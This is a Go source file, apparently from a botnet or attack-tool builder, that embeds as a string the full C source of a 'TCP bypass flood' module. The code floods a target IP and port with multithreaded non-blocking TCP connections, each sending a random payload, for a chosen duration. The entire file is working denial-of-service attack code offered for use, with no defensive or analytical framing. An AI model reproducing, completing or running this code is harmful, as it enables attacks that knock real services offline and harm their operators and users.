package payloads

var TCPBypass = `
// ==================== TCP BYPASS FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>

#define MAX_FDS 1000

static int tcp_bypass_running = 0;
static pthread_t tcp_bypass_threads[100];

struct tcp_bypass_state {
    int fd;
    int state;
    time_t timeout;
};

void *tcp_bypass_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    int length = *(int *)((char *)arg + 72);
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(target_ip);
    
    struct tcp_bypass_state states[MAX_FDS];
    for (int i = 0; i < MAX_FDS; i++) {
        states[i].fd = -1;
        states[i].state = 0;
        states[i].timeout = 0;
    }
    
    char *payload = malloc(length);
    for (int i = 0; i < length; i++) payload[i] = rand() % 256;
    
    time_t start = time(NULL);
    
    while (tcp_bypass_running && time(NULL) - start < duration) {
        for (int i = 0; i < MAX_FDS; i++) {
            switch (states[i].state) {
            case 0:
                if ((states[i].fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) continue;
                fcntl(states[i].fd, F_SETFL, O_NONBLOCK);
                if (connect(states[i].fd, (struct sockaddr *)&addr, sizeof(addr)) != -1 || errno != EINPROGRESS) {
                    close(states[i].fd);
                    states[i].fd = -1;
                    continue;
                }
                states[i].state = 1;
                states[i].timeout = time(NULL);
                break;
            case 1:
                if (states[i].timeout + 5 < time(NULL)) {
                    close(states[i].fd);
                    states[i].fd = -1;
                    states[i].state = 0;
                } else {
                    fd_set write_set;
                    FD_ZERO(&write_set);
                    FD_SET(states[i].fd, &write_set);
                    struct timeval tv = {0, 10};
                    if (select(states[i].fd + 1, NULL, &write_set, NULL, &tv) == 1) {
                        int err = 0;
                        socklen_t err_len = sizeof(int);
                        getsockopt(states[i].fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if (!err) states[i].state = 2;
                        else {
                            close(states[i].fd);
                            states[i].fd = -1;
                            states[i].state = 0;
                        }
                    }
                }
                break;
            case 2:
                send(states[i].fd, payload, length, MSG_NOSIGNAL);
                close(states[i].fd);
                states[i].fd = -1;
                states[i].state = 0;
                break;
            }
        }
        usleep(100);
    }
    
    free(payload);
    for (int i = 0; i < MAX_FDS; i++) {
        if (states[i].fd != -1) close(states[i].fd);
    }
    return NULL;
}

void start_tcp_bypass_attack(char *target, int port, int threads, int duration_sec, int length) {
    if (tcp_bypass_running) return;
    tcp_bypass_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    *((int *)(arg + 72)) = length;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&tcp_bypass_threads[i], NULL, tcp_bypass_flood, arg);
    }
    
    sleep(duration_sec);
    tcp_bypass_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(tcp_bypass_threads[i], NULL);
    }
    free(arg);
}

void stop_tcp_bypass_attack() { tcp_bypass_running = 0; }
// ==================== END TCP BYPASS MODULE ====================
`